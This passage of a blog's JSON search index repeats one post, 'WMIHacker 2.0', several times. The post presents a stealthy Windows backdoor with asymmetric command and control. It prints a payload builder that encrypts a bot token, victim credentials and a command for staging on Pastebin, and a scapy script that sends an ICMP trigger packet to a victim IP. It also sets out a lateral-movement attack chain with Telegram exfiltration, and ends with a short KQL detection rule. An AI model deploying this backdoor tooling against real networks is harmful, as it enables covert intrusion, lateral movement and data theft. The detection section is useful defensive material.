\u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by ``\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric 